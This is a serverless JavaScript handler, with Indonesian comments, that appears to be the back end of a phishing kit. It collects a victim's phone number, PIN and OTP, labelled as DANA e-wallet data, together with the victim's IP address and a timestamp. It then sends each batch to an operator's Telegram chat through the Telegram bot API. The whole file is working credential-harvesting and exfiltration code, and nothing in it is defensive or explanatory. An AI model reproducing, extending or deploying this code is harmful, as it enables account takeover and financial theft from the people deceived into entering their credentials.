const https = require('https');

exports.handler = async (event, context) => {
  // Only allow POST requests
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    const data = JSON.parse(event.body);
    const { type, phone, pin, otp } = data;
    
    // Validasi data yang diperlukan
    if (!type) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'Type is required' })
      };
    }

    // Konfigurasi bot Telegram
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Telegram bot configuration missing');
      return {
        statusCode: 500,
        body: JSON.stringify({ error: 'Server configuration error' })
      };
    }

    // Format pesan berdasarkan jenis data
    let message = '';
    const timestamp = new Date().toLocaleString('id-ID');
    const userIP = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'Unknown';
    
    switch (type) {
      case 'phone':
        message = `📱 *DATA NOMOR DANA* 📱\n\n` +
                  `🕐 Waktu: ${timestamp}\n` +
                  `📞 Nomor: +62${phone}\n` +
                  `🌐 IP: ${userIP}\n` +
                  `=================================`;
        break;
        
      case 'pin':
        message = `🔐 *DATA PIN DANA* 🔐\n\n` +
                  `🕐 Waktu: ${timestamp}\n` +
                  `📞 Nomor: +62${phone}\n` +
                  `🔒 PIN: ${pin}\n` +
                  `🌐 IP: ${userIP}\n` +
                  `=================================`;
        break;
        
      case 'otp':
        message = `📨 *DATA OTP DANA* 📨\n\n` +
                  `🕐 Waktu: ${timestamp}\n` +
                  `📞 Nomor: +62${phone}\n` +
                  `🔒 PIN: ${pin}\n` +
                  `🔢 OTP: ${otp}\n` +
                  `🌐 IP: ${userIP}\n` +
                  `=================================`;
        break;
        
      default:
        return {
          statusCode: 400,
          body: JSON.stringify({ error: 'Invalid type' })
        };
    }

    // Encode message for URL
    const encodedMessage = encodeURIComponent(message);
    
    // URL untuk mengirim pesan ke bot Telegram
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
    
    // Mengirim pesan ke Telegram
    await new Promise((resolve, reject) => {
      https.get(url, (res) => {
        let responseData = '';
        
        res.on('data', (chunk) => {
          responseData += chunk;
        });
        
        res.on('end', () => {
          if (res.statusCode === 200) {
            resolve(responseData);
          } else {
            reject(new Error(`Telegram API error: ${res.statusCode}`));
          }
        });
      }).on('error', (err) => {
        reject(err);
      });
    });

    // Simpan ke database atau logging (opsional)
    console.log('Data received:', JSON.stringify(data));
    
    return {
      statusCode: 200,
      body: JSON.stringify({ 
        success: true, 
        message: 'Data sent successfully' 
      })
    };
    
  } catch (error) {
    console.error('Error processing request:', error);
    
    return {
      statusCode: 500,
      body: JSON.stringify({ 
        error: 'Internal server error',
        details: error.message 
      })
    };
  }
};
